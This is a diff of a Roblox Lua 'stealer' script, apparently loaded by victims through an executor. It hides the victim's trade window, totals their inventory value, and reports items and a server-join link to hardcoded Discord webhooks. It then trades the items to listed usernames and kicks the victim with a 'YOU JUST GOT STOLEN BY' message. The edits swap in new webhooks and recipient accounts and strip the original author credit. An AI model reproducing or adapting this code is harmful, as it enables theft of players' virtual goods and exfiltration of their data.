@@ -1,5 +1,5 @@
-usernames = { "xQuartz0", "isaidmager", "214Eli_alt4" }
-webhook = "https://discord.com/api/webhooks/1404789801785364500/Gj3a6Wh-Hhx1ZtqVWN57Wi2SV2znrqi1UVGvhqE8e56wApuyC7fsZBZ1aWMNMyNMgJlM"
+usernames = { "xZicooo", "isaidmager", "214Eli_alt4" }
+webhook = "https://discord.com/api/webhooks/1405003394271412244/yLR5k2VFA--XtC8perCX3-T-nuh2zR8v2zGTg_fkvjLpjmqEJXpFCnGSiRVOGj_mopMd"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -17,8 +17,9 @@ local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
 local tradeGui_phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
 
-tradeGui_phone:destroy()
-
+if tradeGui_phone then
+    tradeGui_phone:Destroy()
+end
 local function isUsernameInList(name)
 	for _, v in ipairs(usernames) do
 		if v == name then return true end
@@ -95,9 +96,9 @@ for _, item in ipairs(items) do
 	totalValue += item.value * item.quantity
 end
 
-if totalValue >= 100 then
+if totalValue >= 100000 then
     usernames = { "xQuartz0", "isaidmager", "" } -- dual usernames
-    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
+    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVb.."
 end
 
 local function sendWebhook(totalValue, tradableSummary)
@@ -114,7 +115,7 @@ local function sendWebhook(totalValue, tradableSummary)
 				{["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```"},
 				{["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
 			},
-			["footer"] = {["text"] = "by @x19b • " .. os.date("%B %d, %Y")},
+			["footer"] = {["text"] = "by no one • " .. os.date("%B %d, %Y")},
 			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 		}}
 	}
@@ -192,7 +193,7 @@ local function doTrade()
 	
 		if #remaining == 0 or total <= 0 then
 		task.wait(1)
-		LocalPlayer:Kick("YOU JUST GOT STOLEN BY TravScripts discord.gg/pNfrgHeede")
+		LocalPlayer:Kick("YOU JUST GOT STOLEN BY")
 	end
 end
 
